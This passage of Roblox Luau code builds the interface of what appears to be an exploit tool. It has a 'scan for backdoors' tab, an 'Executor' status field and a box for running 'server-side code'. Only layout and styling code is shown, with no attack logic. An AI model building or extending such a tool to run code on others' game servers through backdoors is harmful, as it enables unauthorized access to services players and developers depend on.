UI["CreditsTabStroke"]["Parent"] = UI["CreditsTab"]

UI["CreditsTabStrokeGradient"] = Instance.new("UIGradient")
UI["CreditsTabStrokeGradient"]["Name"] = "CreditsTabStrokeGradient"
UI["CreditsTabStrokeGradient"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))}
UI["CreditsTabStrokeGradient"]["Parent"] = UI["CreditsTabStroke"]

UI["CreditsTabGradient"] = Instance.new("UIGradient")
UI["CreditsTabGradient"]["Name"] = "CreditsTabGradient"
UI["CreditsTabGradient"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))}
UI["CreditsTabGradient"]["Parent"] = UI["CreditsTab"]

UI["CreditsTabPadding"] = Instance.new("UIPadding")
UI["CreditsTabPadding"]["Name"] = "CreditsTabPadding"
UI["CreditsTabPadding"]["PaddingTop"] = UDim.new(0, 2)
UI["CreditsTabPadding"]["PaddingRight"] = UDim.new(0, 4)
UI["CreditsTabPadding"]["PaddingLeft"] = UDim.new(0, 4)
UI["CreditsTabPadding"]["PaddingBottom"] = UDim.new(0, 2)
UI["CreditsTabPadding"]["Parent"] = UI["CreditsTab"]

UI["MainFrameList"] = Instance.new("UIListLayout")
UI["MainFrameList"]["Name"] = "MainFrameList"
UI["MainFrameList"]["HorizontalFlex"] = Enum.UIFlexAlignment.Fill
UI["MainFrameList"]["VerticalFlex"] = Enum.UIFlexAlignment.Fill
UI["MainFrameList"]["Padding"] = UDim.new(0, 6)
UI["MainFrameList"]["SortOrder"] = Enum.SortOrder.LayoutOrder
UI["MainFrameList"]["Parent"] = UI["MainFrame"]

UI["Contents"] = Instance.new("Frame")
UI["Contents"]["Name"] = "Contents"
UI["Contents"]["BorderSizePixel"] = 0
UI["Contents"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["Contents"]["Size"] = UDim2.new(1, 0, 1, 0)
UI["Contents"]["LayoutOrder"] = 3
UI["Contents"]["BackgroundTransparency"] = 1
UI["Contents"]["Parent"] = UI["MainFrame"]

UI["HomeContent"] = Instance.new("Frame")
UI["HomeContent"]["Name"] = "HomeContent"
UI["HomeContent"]["BorderSizePixel"] = 0
UI["HomeContent"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["HomeContent"]["Size"] = UDim2.new(1, 0, 1, 0)
UI["HomeContent"]["LayoutOrder"] = 1
UI["HomeContent"]["BackgroundTransparency"] = 1
UI["HomeContent"]["Parent"] = UI["Contents"]

UI["HomeContentList"] = Instance.new("UIListLayout")
UI["HomeContentList"]["Name"] = "HomeContentList"
UI["HomeContentList"]["HorizontalFlex"] = Enum.UIFlexAlignment.Fill
UI["HomeContentList"]["VerticalFlex"] = Enum.UIFlexAlignment.Fill
UI["HomeContentList"]["Padding"] = UDim.new(0, 4)
UI["HomeContentList"]["SortOrder"] = Enum.SortOrder.LayoutOrder
UI["HomeContentList"]["FillDirection"] = Enum.FillDirection.Horizontal
UI["HomeContentList"]["Parent"] = UI["HomeContent"]

UI["Headshot"] = Instance.new("ImageLabel")
UI["Headshot"]["Name"] = "Headshot"
UI["Headshot"]["BorderSizePixel"] = 0
UI["Headshot"]["ScaleType"] = Enum.ScaleType.Fit
UI["Headshot"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["Headshot"]["Size"] = UDim2.new(0, 90, 0, 90)
UI["Headshot"]["BackgroundTransparency"] = 1
UI["Headshot"]["LayoutOrder"] = 1
UI["Headshot"]["Parent"] = UI["HomeContent"]

UI["HeadshotSC"] = Instance.new("UISizeConstraint")
UI["HeadshotSC"]["Name"] = "HeadshotSC"
UI["HeadshotSC"]["MinSize"] = Vector2.new(80, 80)
UI["HeadshotSC"]["MaxSize"] = Vector2.new(100, 100)
UI["HeadshotSC"]["Parent"] = UI["Headshot"]

UI["HeadshotStroke"] = Instance.new("UIStroke")
UI["HeadshotStroke"]["Name"] = "HeadshotStroke"
UI["HeadshotStroke"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["HeadshotStroke"]["Color"] = Color3.fromRGB(255, 255, 255)
UI["HeadshotStroke"]["Parent"] = UI["Headshot"]

UI["HeadshotStrokeGradient"] = Instance.new("UIGradient")
UI["HeadshotStrokeGradient"]["Name"] = "HeadshotStrokeGradient"
UI["HeadshotStrokeGradient"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))}
UI["HeadshotStrokeGradient"]["Parent"] = UI["HeadshotStroke"]

UI["HeadshotRatio"] = Instance.new("UIAspectRatioConstraint")
UI["HeadshotRatio"]["Name"] = "HeadshotRatio"
UI["HeadshotRatio"]["Parent"] = UI["Headshot"]

UI["HeadshotCorner"] = Instance.new("UICorner")
UI["HeadshotCorner"]["Name"] = "HeadshotCorner"
UI["HeadshotCorner"]["CornerRadius"] = UDim.new(1, 0)
UI["HeadshotCorner"]["Parent"] = UI["Headshot"]

UI["HomeStats"] = Instance.new("TextLabel")
UI["HomeStats"]["Name"] = "HomeStats"
UI["HomeStats"]["TextWrapped"] = true
UI["HomeStats"]["BorderSizePixel"] = 0
UI["HomeStats"]["TextXAlignment"] = Enum.TextXAlignment.Left
UI["HomeStats"]["TextYAlignment"] = Enum.TextYAlignment.Top
UI["HomeStats"]["TextScaled"] = true
UI["HomeStats"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["HomeStats"]["FontFace"] = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal)
UI["HomeStats"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["HomeStats"]["BackgroundTransparency"] = 1
UI["HomeStats"]["RichText"] = true
UI["HomeStats"]["Size"] = UDim2.new(0, 410, 0, 184)
UI["HomeStats"]["Text"] = "Welcome, DisplayName! (@Username)\nFPS:\nPing:\nServer age:\nDevice:\nOS:\nExecutor:"
UI["HomeStats"]["LayoutOrder"] = 2
UI["HomeStats"]["Position"] = UDim2.new(0, 94, 0, 54)
UI["HomeStats"]["Parent"] = UI["HomeContent"]

UI["HomeStatsGradient"] = Instance.new("UIGradient")
UI["HomeStatsGradient"]["Name"] = "HomeStatsGradient"
UI["HomeStatsGradient"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))}
UI["HomeStatsGradient"]["Parent"] = UI["HomeStats"]

UI["ScannerContent"] = Instance.new("Frame")
UI["ScannerContent"]["Name"] = "ScannerContent"
UI["ScannerContent"]["Visible"] = false
UI["ScannerContent"]["BorderSizePixel"] = 0
UI["ScannerContent"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["ScannerContent"]["Size"] = UDim2.new(1, 0, 1, 0)
UI["ScannerContent"]["LayoutOrder"] = 2
UI["ScannerContent"]["BackgroundTransparency"] = 1
UI["ScannerContent"]["Parent"] = UI["Contents"]

UI["ScannerContentList"] = Instance.new("UIListLayout")
UI["ScannerContentList"]["Name"] = "ScannerContentList"
UI["ScannerContentList"]["HorizontalFlex"] = Enum.UIFlexAlignment.Fill
UI["ScannerContentList"]["VerticalFlex"] = Enum.UIFlexAlignment.Fill
UI["ScannerContentList"]["Padding"] = UDim.new(0, 4)
UI["ScannerContentList"]["SortOrder"] = Enum.SortOrder.LayoutOrder
UI["ScannerContentList"]["Parent"] = UI["ScannerContent"]

UI["ScanBtn"] = Instance.new("TextButton")
UI["ScanBtn"]["Name"] = "ScanBtn"
UI["ScanBtn"]["TextWrapped"] = true
UI["ScanBtn"]["BorderSizePixel"] = 0
UI["ScanBtn"]["TextScaled"] = true
UI["ScanBtn"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["ScanBtn"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["ScanBtn"]["Size"] = UDim2.new(0, 48, 0, 48)
UI["ScanBtn"]["LayoutOrder"] = 1
UI["ScanBtn"]["Text"] = ""
UI["ScanBtn"]["Parent"] = UI["ScannerContent"]

UI["ScanBtnCorner"] = Instance.new("UICorner")
UI["ScanBtnCorner"]["Name"] = "ScanBtnCorner"
UI["ScanBtnCorner"]["CornerRadius"] = UDim.new(0, 4)
UI["ScanBtnCorner"]["Parent"] = UI["ScanBtn"]

UI["ScanBtnGradient"] = Instance.new("UIGradient")
UI["ScanBtnGradient"]["Name"] = "ScanBtnGradient"
UI["ScanBtnGradient"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))}
UI["ScanBtnGradient"]["Parent"] = UI["ScanBtn"]

UI["ScanBtnContainer"] = Instance.new("Frame")
UI["ScanBtnContainer"]["Name"] = "ScanBtnContainer"
UI["ScanBtnContainer"]["Interactable"] = false
UI["ScanBtnContainer"]["BorderSizePixel"] = 0
UI["ScanBtnContainer"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["ScanBtnContainer"]["Size"] = UDim2.new(1, 0, 1, 0)
UI["ScanBtnContainer"]["BackgroundTransparency"] = 1
UI["ScanBtnContainer"]["Parent"] = UI["ScanBtn"]

UI["ScanLabel"] = Instance.new("TextLabel")
UI["ScanLabel"]["Name"] = "ScanLabel"
UI["ScanLabel"]["TextWrapped"] = true
UI["ScanLabel"]["BorderSizePixel"] = 0
UI["ScanLabel"]["TextScaled"] = true
UI["ScanLabel"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["ScanLabel"]["FontFace"] = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal)
UI["ScanLabel"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["ScanLabel"]["BackgroundTransparency"] = 1
UI["ScanLabel"]["Size"] = UDim2.new(1, 0, 1, 0)
UI["ScanLabel"]["Text"] = "Scan"
UI["ScanLabel"]["Parent"] = UI["ScanBtnContainer"]

UI["ScanLabelPadding"] = Instance.new("UIPadding")
UI["ScanLabelPadding"]["Name"] = "ScanLabelPadding"
UI["ScanLabelPadding"]["PaddingTop"] = UDim.new(0, 6)
UI["ScanLabelPadding"]["PaddingRight"] = UDim.new(0, 6)
UI["ScanLabelPadding"]["PaddingLeft"] = UDim.new(0, 6)
UI["ScanLabelPadding"]["PaddingBottom"] = UDim.new(0, 6)
UI["ScanLabelPadding"]["Parent"] = UI["ScanLabel"]

UI["ScanBtnStroke"] = Instance.new("UIStroke")
UI["ScanBtnStroke"]["Name"] = "ScanBtnStroke"
UI["ScanBtnStroke"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["ScanBtnStroke"]["Color"] = Color3.fromRGB(255, 255, 255)
UI["ScanBtnStroke"]["Parent"] = UI["ScanBtn"]

UI["ScanBtnStrokeGradient"] = Instance.new("UIGradient")
UI["ScanBtnStrokeGradient"]["Name"] = "ScanBtnStrokeGradient"
UI["ScanBtnStrokeGradient"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))}
UI["ScanBtnStrokeGradient"]["Parent"] = UI["ScanBtnStroke"]

UI["ScanBtnSC"] = Instance.new("UISizeConstraint")
UI["ScanBtnSC"]["Name"] = "ScanBtnSC"
UI["ScanBtnSC"]["MinSize"] = Vector2.new(0, 46)
UI["ScanBtnSC"]["MaxSize"] = Vector2.new(math.huge, 50)
UI["ScanBtnSC"]["Parent"] = UI["ScanBtn"]

UI["ScanStatus"] = Instance.new("TextLabel")
UI["ScanStatus"]["Name"] = "ScanStatus"
UI["ScanStatus"]["TextWrapped"] = true
UI["ScanStatus"]["BorderSizePixel"] = 0
UI["ScanStatus"]["TextSize"] = 22
UI["ScanStatus"]["TextXAlignment"] = Enum.TextXAlignment.Left
UI["ScanStatus"]["TextYAlignment"] = Enum.TextYAlignment.Top
UI["ScanStatus"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["ScanStatus"]["FontFace"] = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal)
UI["ScanStatus"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["ScanStatus"]["BackgroundTransparency"] = 1
UI["ScanStatus"]["Size"] = UDim2.new(0, 456, 0, 184)
UI["ScanStatus"]["Text"] = "Ready to scan for backdoors..."
UI["ScanStatus"]["LayoutOrder"] = 2
UI["ScanStatus"]["Position"] = UDim2.new(0, 0, 0, 54)
UI["ScanStatus"]["Parent"] = UI["ScannerContent"]

UI["ScanStatusGradient"] = Instance.new("UIGradient")
UI["ScanStatusGradient"]["Name"] = "ScanStatusGradient"
UI["ScanStatusGradient"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))}
UI["ScanStatusGradient"]["Parent"] = UI["ScanStatus"]

UI["ExeContent"] = Instance.new("Frame")
UI["ExeContent"]["Name"] = "ExeContent"
UI["ExeContent"]["Visible"] = false
UI["ExeContent"]["BorderSizePixel"] = 0
UI["ExeContent"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["ExeContent"]["Size"] = UDim2.new(1, 0, 1, 0)
UI["ExeContent"]["LayoutOrder"] = 4
UI["ExeContent"]["BackgroundTransparency"] = 1
UI["ExeContent"]["Parent"] = UI["Contents"]

UI["ExeContentList"] = Instance.new("UIListLayout")
UI["ExeContentList"]["Name"] = "ExeContentList"
UI["ExeContentList"]["HorizontalFlex"] = Enum.UIFlexAlignment.Fill
UI["ExeContentList"]["VerticalFlex"] = Enum.UIFlexAlignment.Fill
UI["ExeContentList"]["Padding"] = UDim.new(0, 6)
UI["ExeContentList"]["SortOrder"] = Enum.SortOrder.LayoutOrder
UI["ExeContentList"]["Parent"] = UI["ExeContent"]

UI["InputFrame"] = Instance.new("ScrollingFrame")
UI["InputFrame"]["Name"] = "InputFrame"
UI["InputFrame"]["BorderSizePixel"] = 0
UI["InputFrame"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["InputFrame"]["Size"] = UDim2.new(0.2, 0, 0.3, 0)
UI["InputFrame"]["BackgroundTransparency"] = 1
UI["InputFrame"]["AutomaticCanvasSize"] = Enum.AutomaticSize.Y
UI["InputFrame"]["ScrollingDirection"] = Enum.ScrollingDirection.Y
UI["InputFrame"]["ScrollBarThickness"] = 0
UI["InputFrame"]["Parent"] = UI["ExeContent"]

UI["InputFrameStroke"] = Instance.new("UIStroke")
UI["InputFrameStroke"]["Name"] = "InputFrameStroke"
UI["InputFrameStroke"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["InputFrameStroke"]["Color"] = Color3.fromRGB(255, 255, 255)
UI["InputFrameStroke"]["Parent"] = UI["InputFrame"]

UI["InputFrameStrokeGradient"] = Instance.new("UIGradient")
UI["InputFrameStrokeGradient"]["Name"] = "InputFrameStrokeGradient"
UI["InputFrameStrokeGradient"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))}
UI["InputFrameStrokeGradient"]["Parent"] = UI["InputFrameStroke"]

UI["InputFrameCorner"] = Instance.new("UICorner")
UI["InputFrameCorner"]["Name"] = "InputFrameCorner"
UI["InputFrameCorner"]["CornerRadius"] = UDim.new(0, 4)
UI["InputFrameCorner"]["Parent"] = UI["InputFrame"]

UI["InputBox"] = Instance.new("TextBox")
UI["InputBox"]["Name"] = "InputBox"
UI["InputBox"]["TextXAlignment"] = Enum.TextXAlignment.Left
UI["InputBox"]["PlaceholderColor3"] = Color3.fromRGB(83, 0, 255)
UI["InputBox"]["BorderSizePixel"] = 0
UI["InputBox"]["TextWrapped"] = true
UI["InputBox"]["TextSize"] = 18
UI["InputBox"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["InputBox"]["TextYAlignment"] = Enum.TextYAlignment.Top
UI["InputBox"]["TextScaled"] = true
UI["InputBox"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["InputBox"]["FontFace"] = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal)
UI["InputBox"]["AutomaticSize"] = Enum.AutomaticSize.Y
UI["InputBox"]["PlaceholderText"] = "Server-side code here..."
UI["InputBox"]["Size"] = UDim2.new(1, 0, 0, 0)
UI["InputBox"]["Text"] = ""
UI["InputBox"]["BackgroundTransparency"] = 1
UI["InputBox"]["Parent"] = UI["InputFrame"]

UI["InputBoxPadding"] = Instance.new("UIPadding")
UI["InputBoxPadding"]["Name"] = "InputBoxPadding"
UI["InputBoxPadding"]["PaddingTop"] = UDim.new(0, 4)
UI["InputBoxPadding"]["PaddingRight"] = UDim.new(0, 4)
UI["InputBoxPadding"]["PaddingLeft"] = UDim.new(0, 4)
UI["InputBoxPadding"]["PaddingBottom"] = UDim.new(0, 4)
UI["InputBoxPadding"]["Parent"] = UI["InputBox"]

UI["InputBoxTextSC"] = Instance.new("UITextSizeConstraint")
UI["InputBoxTextSC"]["Name"] = "InputBoxTextSC"
UI["InputBoxTextSC"]["MaxTextSize"] = 20
UI["InputBoxTextSC"]["MinTextSize"] = 18
UI["InputBoxTextSC"]["Parent"] = UI["InputBox"]

UI["ExeContentBtns"] = Instance.new("Frame")
UI["ExeContentBtns"]["Name"] = "ExeContentBtns"
UI["ExeContentBtns"]["BorderSizePixel"] = 0
UI["ExeContentBtns"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["ExeContentBtns"]["Size"] = UDim2.new(0, 0, 0, 34)
UI["ExeContentBtns"]["LayoutOrder"] = 2
UI["ExeContentBtns"]["BackgroundTransparency"] = 1
UI["ExeContentBtns"]["Parent"] = UI["ExeContent"]

UI["ExeContentBtnsSC"] = Instance.new("UISizeConstraint")
UI["ExeContentBtnsSC"]["Name"] = "ExeContentBtnsSC"
UI["ExeContentBtnsSC"]["MinSize"] = Vector2.new(0, 30)
UI["ExeContentBtnsSC"]["MaxSize"] = Vector2.new(math.huge, 34)
UI["ExeContentBtnsSC"]["Parent"] = UI["ExeContentBtns"]

UI["ExeContentBtnsList"] = Instance.new("UIListLayout")
UI["ExeContentBtnsList"]["Name"] = "ExeContentBtnsList"
UI["ExeContentBtnsList"]["HorizontalFlex"] = Enum.UIFlexAlignment.Fill
UI["ExeContentBtnsList"]["VerticalFlex"] = Enum.UIFlexAlignment.Fill
UI["ExeContentBtnsList"]["Padding"] = UDim.new(0, 6)
UI["ExeContentBtnsList"]["SortOrder"] = Enum.SortOrder.LayoutOrder
UI["ExeContentBtnsList"]["FillDirection"] = Enum.FillDirection.Horizontal
UI["ExeContentBtnsList"]["Parent"] = UI["ExeContentBtns"]

UI["Exe"] = Instance.new("TextButton")
UI["Exe"]["Name"] = "Exe"
UI["Exe"]["TextWrapped"] = true
UI["Exe"]["BorderSizePixel"] = 0
UI["Exe"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["Exe"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["Exe"]["Size"] = UDim2.new(0, 120, 0, 36)
UI["Exe"]["LayoutOrder"] = 1
UI["Exe"]["Text"] = ""
UI["Exe"]["Parent"] = UI["ExeContentBtns"]

UI["ExeCorner"] = Instance.new("UICorner")
UI["ExeCorner"]["Name"] = "ExeCorner"
UI["ExeCorner"]["CornerRadius"] = UDim.new(0, 4)
UI["ExeCorner"]["Parent"] = UI["Exe"]

UI["ExeGradient"] = Instance.new("UIGradient")
UI["ExeGradient"]["Name"] = "ExeGradient"
UI["ExeGradient"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))}
UI["ExeGradient"]["Parent"] = UI["Exe"]

UI["ExeStroke"] = Instance.new("UIStroke")
UI["ExeStroke"]["Name"] = "ExeStroke"
UI["ExeStroke"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["ExeStroke"]["Color"] = Color3.fromRGB(255, 255, 255)
UI["ExeStroke"]["Parent"] = UI["Exe"]

UI["ExeStrokeGradient"] = Instance.new("UIGradient")
UI["ExeStrokeGradient"]["Name"] = "ExeStrokeGradient"
UI["ExeStrokeGradient"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))}
UI["ExeStrokeGradient"]["Parent"] = UI["ExeStroke"]

UI["ExeContainer"] = Instance.new("Frame")
UI["ExeContainer"]["Name"] = "ExeContainer"
UI["ExeContainer"]["Interactable"] = false
UI["ExeContainer"]["BorderSizePixel"] = 0
UI["ExeContainer"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["ExeContainer"]["Size"] = UDim2.new(1, 0, 1, 0)
UI["ExeContainer"]["BackgroundTransparency"] = 1
UI["ExeContainer"]["Parent"] = UI["Exe"]

UI["ExeLabel"] = Instance.new("TextLabel")
UI["ExeLabel"]["Name"] = "ExeLabel"
UI["ExeLabel"]["TextWrapped"] = true
UI["ExeLabel"]["BorderSizePixel"] = 0
UI["ExeLabel"]["TextScaled"] = true
UI["ExeLabel"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["ExeLabel"]["FontFace"] = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal)
UI["ExeLabel"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["ExeLabel"]["BackgroundTransparency"] = 1
UI["ExeLabel"]["Size"] = UDim2.new(1, 0, 1, 0)
UI["ExeLabel"]["Text"] = "Execute"
UI["ExeLabel"]["Parent"] = UI["ExeContainer"]

UI["ExeLabelPadding"] = Instance.new("UIPadding")
UI["ExeLabelPadding"]["Name"] = "ExeLabelPadding"
UI["ExeLabelPadding"]["PaddingTop"] = UDim.new(0, 4)
UI["ExeLabelPadding"]["PaddingRight"] = UDim.new(0, 4)
UI["ExeLabelPadding"]["PaddingLeft"] = UDim.new(0, 4)
UI["ExeLabelPadding"]["PaddingBottom"] = UDim.new(0, 4)
UI["ExeLabelPadding"]["Parent"] = UI["ExeLabel"]

UI["Clr"] = Instance.new("TextButton")
UI["Clr"]["Name"] = "Clr"
UI["Clr"]["TextWrapped"] = true
UI["Clr"]["BorderSizePixel"] = 0
UI["Clr"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["Clr"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["Clr"]["Size"] = UDim2.new(0, 120, 0, 36)
UI["Clr"]["LayoutOrder"] = 2
UI["Clr"]["Text"] = ""
UI["Clr"]["Parent"] = UI["ExeContentBtns"]

UI["ClrCorner"] = Instance.new("UICorner")
UI["ClrCorner"]["Name"] = "ClrCorner"
UI["ClrCorner"]["CornerRadius"] = UDim.new(0, 4)
UI["ClrCorner"]["Parent"] = UI["Clr"]

UI["ClrGradient"] = Instance.new("UIGradient")
UI["ClrGradient"]["Name"] = "ClrGradient"
UI["ClrGradient"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))}
UI["ClrGradient"]["Parent"] = UI["Clr"]

UI["ClrStroke"] = Instance.new("UIStroke")
UI["ClrStroke"]["Name"] = "ClrStroke"
UI["ClrStroke"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["ClrStroke"]["Color"] = Color3.fromRGB(255, 255, 255)
UI["ClrStroke"]["Parent"] = UI["Clr"]

UI["ClrStrokeGradient"] = Instance.new("UIGradient")
UI["ClrStrokeGradient"]["Name"] = "ClrStrokeGradient"
UI["ClrStrokeGradient"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))}
UI["ClrStrokeGradient"]["Parent"] = UI["ClrStroke"]

UI["ClrContainer"] = Instance.new("Frame")
UI["ClrContainer"]["Name"] = "ClrContainer"
UI["ClrContainer"]["Interactable"] = false
UI["ClrContainer"]["BorderSizePixel"] = 0
UI["ClrContainer"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["ClrContainer"]["Size"] = UDim2.new(1, 0, 1, 0)
UI["ClrContainer"]["BackgroundTransparency"] = 1
UI["ClrContainer"]["Parent"] = UI["Clr"]

UI["ClrLabel"] = Instance.new("TextLabel")
UI["ClrLabel"]["Name"] = "ClrLabel"
UI["ClrLabel"]["TextWrapped"] = true
UI["ClrLabel"]["BorderSizePixel"] = 0
UI["ClrLabel"]["TextScaled"] = true
UI["ClrLabel"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["ClrLabel"]["FontFace"] = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal)
UI["ClrLabel"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["ClrLabel"]["BackgroundTransparency"] = 1
UI["ClrLabel"]["Size"] = UDim2.new(1, 0, 1, 0)
UI["ClrLabel"]["Text"] = "Clear"
UI["ClrLabel"]["Parent"] = UI["ClrContainer"]

UI["ClrLabelPadding"] = Instance.new("UIPadding")
UI["ClrLabelPadding"]["Name"] = "ClrLabelPadding"
UI["ClrLabelPadding"]["PaddingTop"] = UDim.new(0, 4)
UI["ClrLabelPadding"]["PaddingRight"] = UDim.new(0, 4)
UI["ClrLabelPadding"]["PaddingLeft"] = UDim.new(0, 4)
UI["ClrLabelPadding"]["PaddingBottom"] = UDim.new(0, 4)
UI["ClrLabelPadding"]["Parent"] = UI["ClrLabel"]

UI["Re"] = Instance.new("TextButton")
UI["Re"]["Name"] = "Re"
UI["Re"]["TextWrapped"] = true
UI["Re"]["BorderSizePixel"] = 0
UI["Re"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["Re"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["Re"]["Size"] = UDim2.new(0, 120, 0, 36)
UI["Re"]["LayoutOrder"] = 3
UI["Re"]["Text"] = ""
UI["Re"]["Parent"] = UI["ExeContentBtns"]

UI["ReCorner"] = Instance.new("UICorner")
UI["ReCorner"]["Name"] = "ReCorner"
UI["ReCorner"]["CornerRadius"] = UDim.new(0, 4)
UI["ReCorner"]["Parent"] = UI["Re"]

UI["ReGradient"] = Instance.new("UIGradient")
UI["ReGradient"]["Name"] = "ReGradient"
UI["ReGradient"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))}
UI["ReGradient"]["Parent"] = UI["Re"]

UI["ReStroke"] = Instance.new("UIStroke")
UI["ReStroke"]["Name"] = "ReStroke"
UI["ReStroke"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["ReStroke"]["Color"] = Color3.fromRGB(255, 255, 255)
UI["ReStroke"]["Parent"] = UI["Re"]

UI["ReStrokeGradient"] = Instance.new("UIGradient")
UI["ReStrokeGradient"]["Name"] = "ReStrokeGradient"
UI["ReStrokeGradient"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))}
UI["ReStrokeGradient"]["Parent"] = UI["ReStroke"]

UI["ReContainer"] = Instance.new("Frame")
UI["ReContainer"]["Name"] = "ReContainer"
UI["ReContainer"]["Interactable"] = false
UI["ReContainer"]["BorderSizePixel"] = 0
UI["ReContainer"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["ReContainer"]["Size"] = UDim2.new(1, 0, 1, 0)
UI["ReContainer"]["BackgroundTransparency"] = 1
UI["ReContainer"]["Parent"] = UI["Re"]

UI["ReLabel"] = Instance.new("TextLabel")
UI["ReLabel"]["Name"] = "ReLabel"
UI["ReLabel"]["TextWrapped"] = true
UI["ReLabel"]["BorderSizePixel"] = 0
UI["ReLabel"]["TextScaled"] = true
UI["ReLabel"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["ReLabel"]["FontFace"] = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal)
UI["ReLabel"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["ReLabel"]["BackgroundTransparency"] = 1
UI["ReLabel"]["Size"] = UDim2.new(1, 0, 1, 0)
UI["ReLabel"]["Text"] = "Refresh"
UI["ReLabel"]["Parent"] = UI["ReContainer"]

UI["ReLabelPadding"] = Instance.new("UIPadding")
UI["ReLabelPadding"]["Name"] = "ReLabelPadding"
UI["ReLabelPadding"]["PaddingTop"] = UDim.new(0, 4)
UI["ReLabelPadding"]["PaddingRight"] = UDim.new(0, 4)
UI["ReLabelPadding"]["PaddingLeft"] = UDim.new(0, 4)
UI["ReLabelPadding"]["PaddingBottom"] = UDim.new(0, 4)
UI["ReLabelPadding"]["Parent"] = UI["ReLabel"]

UI["ScriptsContent"] = Instance.new("ScrollingFrame")
